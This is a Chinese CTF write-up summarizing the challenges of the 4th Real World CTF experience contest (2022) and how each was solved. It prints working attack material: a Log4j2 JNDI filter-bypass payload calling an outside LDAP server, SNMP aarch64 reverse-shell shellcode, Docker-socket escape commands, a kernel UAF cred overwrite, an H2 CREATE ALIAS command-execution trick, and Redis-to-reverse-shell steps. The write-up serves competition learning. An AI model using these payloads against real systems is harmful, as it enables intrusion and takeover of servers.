---
title: 赛题全解|第四届 RWCTF 体验赛 WriteUp
contest: 第四届 Real World CTF 体验赛
year: 2022
difficulty: hard
vuln_type: pwn_unknown
tags: [Java-Processor, Annotation-Processing, SNMP-aarch64, kernel-UAF, Docker-escape, lvm-vm, CAP_DAC_OVERRIDE, QEMU-RTOS, Log4j-JNDI, Redis-unauth, H2-Database, phpMyAdmin, Pentest-Pivoting]
attack_chain:
- Secured Java: 扩展javax.annotation.processing.AbstractProcessor+读取flag+打包为jar(META-INF/services)+远程发送
- Remote Debugger: 39支战队解出(简单Java JDWP调试)
- Be-an-IoT-Hacker: SNMP SET OID 1.3.6.1.4.1.23333.1.0写入aarch64 shellcode+反弹shell
- Digging into Kernel: kmem_cache_create("lalala", 192, 0, 0, 0)+xkmod_ioctl三命令(alloc/rd/wt)+fork子进程+UAF改cred.uid=0提权
- Be-a-Docker-Escaper: docker -m 128m挂载docker.sock+privileged+挂载/dev/sda1读宿主机flag
- Be-a-VM-Escaper: 自定义lvm VM(PUSH/POP/ADD/SUB/IFEQ/JMP等)+libc-2.31栈地址计算+ret+system(/bin/sh)
- Phonograph: CAP_DAC_OVERRIDE capability读/records+CVE-2016-1247 /etc/ld.so.preload提权
- the REAL Menu Challenge: QEMU vexpress-a9 + 0x600104D0栈溢出+shellcode(ldr r0 flag; ldr pc puts)
- 1log4flag: Log4j2 RCE+${j${::-n}di:${::-l}dap://...}绕字符串检查+su18/JNDI工具
- 2Be-a-Database-Hacker: Redis未授权+写公钥或定时任务反弹+H2数据库CREATE ALIAS SHELLEXEC执行whoami
key_payload: Log4j2 ${j${::-n}di:ldap://} + H2 CREATE ALIAS SHELLEXEC
one_liner: 第四届Real World CTF体验赛赛题全解,涵盖Java Processor注解处理+SNMP aarch64 PWN+kernel UAF+Docker逃逸+lvm VM+CAP_DAC_OVERRIDE+Log4j JNDI+Redis+H2 RCE。
lesson: Real World CTF体验赛质量顶级,涵盖IOT/内核/容器/VM/CAP/JNDI/Redis/H2等真实场景;Log4j2字符串绕过${j${::-n}di:${::-l}dap}是2022热点;H2数据库CREATE ALIAS是Web Java常见反序列化路径。
quality: high
---

## 题目列表

PWN(8): Secured Java / Remote Debugger / Be-an-IoT-Hacker / Digging into Kernel / Be-a-Docker-Escaper / Be-a-VM-Escaper / Phonograph / the REAL Menu Challenge
Web(2): 1log4flag / 2Be-a-Database-Hacker
Real World(>2): 多个真实场景综合

## 关键考点

### Secured Java (0解)
- 扩展javax.annotation.processing.AbstractProcessor
- 在处理函数或static中读取flag输出
- 打包为jar,类名加入META-INF/services/javax.annotation.processing.Processor
- 远程发送Java源码+jar获取flag

### Be-an-IoT-Hacker (0解)
- SNMP SET写入aarch64 shellcode
- payload = p64(0x4DE400)*17 + p64(0xdeadbeef) + ... + connect+cat /bin/sh
- 工具:easysnmp的snmp_set + pwntools的asm(shellcraft.connect)+shellcraft.cat

### Digging into Kernel (22解)
- kmem_cache_create("lalala", 192, 0, 0, 0)创建slab
- xkmod_ioctl三命令:
  - 0x1111111 alloc:kmem_cache_alloc(s, 3264)
  - 0x7777777 rd:copy_to_user(buf+offset, value, len)
  - 0x6666666 wt:copy_from_user(buf+offset, value, len)
- 攻击:
  1. alloc申请堆块,close(fd)释放
  2. fork子进程,子进程申请cred
  3. 子进程UAF修改cred.uid=0提权

### Be-a-Docker-Escaper (16解)
- docker run -i -m 128m -v /var/run/docker.sock:/s
- docker -H unix:///s run -i --privileged ubuntu bash
- mkdir /tmp/a /dev/sda1 /tmp/a mount /dev/sda1 /tmp/a
- chmod 777 /tmp/a/root/flag + cat

### Be-a-VM-Escaper (5解)
- 自定义lvm VM指令集:NOP/PUSH/POP/STORE/LOAD/ADD/SUB/IFEQ/JMP/PRINT
- load(-40) push(0x1120) sub() store(0) 计算proc_base
- load(-27) push(0x13900) sub() store(1) 计算栈地址
- load(-35) push(0x662e2) sub() store(2) 计算libc_base
- 写入-0x2000000000000000+0x9C61-0x9C64: ret/pop rdi;ret/binsh/system
- p.interactive()

### Phonograph (2解)
- /usr/local/bin/phonograph有CAP_DAC_OVERRIDE capability
- 读/records中文件
- /tmp目录file spray软链接+CVE-2016-1247写/etc/ld.so.preload

### the REAL Menu Challenge (1解)
- QEMU vexpress-a9模拟RTOS
- 0x600104D0函数栈溢出
- 0x60022E60 = flag_addr, 0x60020698 = puts_addr
- shellcode = ldr r0, =0x60022E60; ldr pc, =0x60020698
- payload = b'a'*0x14 + p32(0x6045a518) + shellcode

### 1log4flag (72解)
- Log4j2 RCE但有字符串检查
- 绕: ${j${::-n}di:${::-l}dap://your_server:1234/a}
- 工具:su18/JNDI

### 2Be-a-Database-Hacker (71解)
- Redis未授权访问,写任意文件
- H2数据库CREATE ALIAS SHELLEXEC AS 'String shellexec(String cmd) throws java.io.IOException { ... }'
- 反弹shell

## 实战价值
- Real World CTF体验赛是真实场景+企业级难度的标杆
- Log4j2字符串绕过${j${::-n}di:${::-l}dap}是2022经典绕过
- H2数据库CREATE ALIAS是Java Web RCE的稳定向量
- SNMP SET是IoT设备初始攻击面
- /etc/ld.so.preload是Linux SUID+CAP组合的提权经典
- QEMU栈溢出模拟RTOS是IoT PWN高频场景
